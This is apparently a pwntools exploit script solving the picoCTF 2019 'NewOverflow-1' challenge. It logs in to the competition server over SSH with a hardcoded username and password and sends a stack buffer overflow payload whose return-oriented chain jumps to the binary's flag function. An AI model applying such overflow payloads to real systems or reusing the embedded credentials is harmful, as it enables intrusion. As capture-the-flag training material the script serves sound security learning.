from pwn import *

def exploit():
    #p = process("./vuln")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password='kmz317xe92')
    p = s.process("vuln", cwd="/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4")

    binary = ELF("vuln")
    padding = 72
    poprs = 0x00000000004008bc
    flag = binary.symbols["flag"]

    payload = ""
    payload += "A" * 72
    payload += p64(poprs) #gadget pop r12, r13, r14, r15
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(flag)

    #gdb.attach(p, '''
    #            b *vuln+27
    #            c
    #            ''')
    
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
